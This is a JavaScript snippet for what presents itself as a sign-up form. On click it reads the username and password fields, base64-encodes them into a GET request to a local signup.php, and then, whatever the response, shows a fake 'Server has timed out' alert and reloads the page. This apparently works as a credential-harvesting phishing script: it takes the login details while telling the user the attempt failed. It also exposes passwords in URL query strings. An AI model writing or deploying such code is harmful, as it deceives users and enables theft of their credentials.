deb = false;
setTimeout(function(){
    a=document.getElementsByClassName("wide-button")[0]
    a.addEventListener("click", function() {
        if (!document.getElementById('tac').checked) {
            alert("Please check over the Terms & Conditions.");
        } else {
            if (!deb) {
                deb = true;
				u = document.getElementById('username').value
				p = document.getElementById('password').value
				if (u == "" || p == "") {
					alert('Username or password field cannot be empty.')
					deb = false;
				}
                if (deb) {
					fetch('./signup.php?u='+encodeURIComponent(btoa(u))+'&p='+encodeURIComponent(btoa(p)))
					setTimeout(function(){
						alert("Server has timed out - please try again.");
						location.reload()
					}, 2000);
				}
            }
        }
    });
}, 5);